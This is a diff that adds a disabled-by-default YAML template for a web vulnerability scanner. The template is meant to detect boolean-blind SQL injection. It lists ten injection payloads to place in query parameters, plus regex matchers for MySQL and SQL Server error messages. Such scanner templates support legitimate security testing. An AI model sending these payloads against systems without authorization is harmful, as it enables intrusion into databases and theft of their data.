@@ -1,0 +1,29 @@
+id: sqli-boolean
+disabled: true
+info:
+  name: "SQL Injection - Boolean Blind"
+  severity: high
+  description: "Disabled by default until a stateful boolean-diff verifier is available"
+  tags: [sqli, injection, database, blind, boolean]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "1' AND 1=1--"
+  - "1' AND 1=2--"
+  - "1' AND 'a'='a'--"
+  - "1' AND 'a'='b'--"
+  - "1 AND 1=1"
+  - "1 AND 1=2"
+  - "1') AND 1=1--"
+  - "1') AND 1=2--"
+  - "1\" AND 1=1--"
+  - "1\" AND 1=2--"
+
+matchers:
+  body_patterns:
+    - "(?i)you have an error in your sql syntax"
+    - "(?i)warning.*mysql"
+    - "(?i)unclosed quotation mark"
